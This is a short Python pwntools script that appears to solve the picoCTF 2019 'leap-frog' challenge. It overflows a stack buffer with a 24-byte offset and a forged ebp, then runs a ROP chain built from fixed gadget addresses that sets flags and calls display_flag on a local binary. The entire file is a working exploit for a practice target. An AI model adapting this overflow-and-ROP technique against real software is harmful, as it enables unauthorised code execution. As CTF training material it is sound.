#!/usr/bin/python

from pwn import *

overflow_offset = 24

e = ELF('/home/yuvaly0/Desktop/pico2019/leap-frog/rop')

rop = ROP(e)
rop.leapA()
rop.raw(0x08048ac0)  # add al, byte ptr [ebp - 0x3b] ; ret
rop.raw(0x080485f3)  # mov byte ptr [eax + 0x3d], 1 ; nop ; pop ebp ; ret
rop.raw(0xBABABABA)  # popped into ebp
rop.leap2(0xdeadbeef)
rop.display_flag()

location_of_2 = next(e.search(p32(2)))
wanted_ebp = p32(location_of_2 + 0x3b)

garbage = 'A' * overflow_offset

payload = garbage + wanted_ebp + str(rop)

log.info(hexdump(payload))

proc = process('/home/yuvaly0/Desktop/pico2019/leap-frog/rop')
proc.sendlineafter("Enter your input> ", payload)
print proc.recvall()